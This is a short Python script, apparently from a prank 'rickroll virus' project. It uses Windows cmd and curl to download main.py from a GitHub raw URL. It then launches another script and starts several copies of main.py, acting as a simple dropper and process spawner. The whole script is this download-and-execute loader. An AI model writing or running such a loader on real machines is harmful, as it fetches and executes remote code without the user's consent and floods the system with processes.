import os
from os.path import exists

if not exists(os.getcwd() + "/main.py"):
    os.system("start  cmd /c cd " + os.getcwd())
    os.system("start  cmd /c curl -o main.py https://raw.githubusercontent.com/rauldhs/rickroll_virus/main/main.py")
    os.system("start /min  cmd /c python idk.py")
else:
    for i in range(0,5):
        os.system("start /min  cmd /c python main.py")

    os.system("start  cmd /c python main.py")





